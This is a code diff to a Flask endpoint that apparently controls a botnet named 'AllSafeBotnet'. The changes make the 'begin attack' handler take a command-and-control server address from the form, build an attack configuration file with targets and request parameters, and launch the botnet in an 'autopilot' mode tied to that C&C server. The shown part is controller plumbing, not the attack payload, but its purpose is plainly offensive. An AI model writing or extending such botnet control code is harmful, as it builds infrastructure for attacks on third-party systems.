@@ -50,8 +50,12 @@ set to False.
 def performAttack():
     if 'attack' in request.form:
         if request.form['attack'] == 'begin':
+            # retrieving and polishing C&C server and prepare config file
+            cc_server = prepareConfigFile(request.form)
+            if '://' not in cc_server:
+                cc_server = 'http://' + cc_server
             allsafe = Worker.AllSafeBotnet()
-            allsafe.attack('./data/current_attack.txt', override=True)
+            allsafe.autopilot(cc_server, './data/current_attack.txt', 5, override=False)
             return "OK", 200
 
     else:
@@ -86,7 +90,7 @@ def performAttack():
 #         return False
 
 
-def prepareConfigFile(where, params):
+def prepareConfigFile(params, where='./data/current_attack.txt'):
     #The json file used as example will be used in order to not rwrite the already existing schema
     file = open("./utils/config_schema_example.json", "r")
     text = file.read()
@@ -106,12 +110,11 @@ def prepareConfigFile(where, params):
     # TODO add prox
     paramconfig['encoding'] = params['encoding']
     configfile['targets'][0]['request_params'] = paramconfig
-
     #The json configuration will be written
-    file = open("./data/current_attack.txt", "w")
-    file.write(json.dumps(configfile))
+    file = open(where, "w")
+    file.write(json.dumps(configfile,indent=4))
     file.close()
-    return
+    return paramconfig['cc_server']
 
 
 
